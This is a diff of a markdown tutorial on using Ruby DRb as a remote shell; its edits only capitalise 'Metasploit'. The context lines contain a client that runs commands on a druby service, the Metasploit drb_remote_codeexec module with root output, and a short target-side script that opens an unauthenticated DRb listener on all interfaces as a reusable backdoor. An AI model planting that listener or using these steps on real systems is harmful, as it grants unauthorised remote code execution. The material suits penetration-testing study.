@@ -46,7 +46,7 @@ rshell = DRbObject.new_with_uri("druby://192.168.0.13:8080")
 puts rshell.exec "id"
 ```
 
-Or you can use metasploit module to get an elegant shell! 
+Or you can use a Metasploit module to get an elegant shell! 
 
 ```bash
 msf > use exploit/linux/misc/drb_remote_codeexec 
@@ -76,7 +76,7 @@ uid=0(root) gid=0(root) groups=0(root)
 As you can see, even you loose the session you can connect again and again; it's a service, remember? 
 
 
-Note: For using metasploit module *only*, you don't need even the RShell class. You just need the following on the target side.
+Note: For using a Metasploit module *only*, you don't need even the RShell class. You just need the following on the target side.
 
 ```ruby
 #!/usr/bin/env ruby
@@ -84,6 +84,6 @@ require 'drb'
 DRb.start_service("druby://0.0.0.0:8080", []).thread.join
 ```
 
-I recommend to use the first code in case metasploit is not available.
+I recommend to use the first code in case Metasploit is not available.
 
-Read more [technical details](http://blog.recurity-labs.com/archives/2011/05/12/druby_for_penetration_testers/) about the metasploit module "drb_remote_codeexe"
+Read more [technical details](http://blog.recurity-labs.com/archives/2011/05/12/druby_for_penetration_testers/) about the Metasploit module "drb_remote_codeexe"
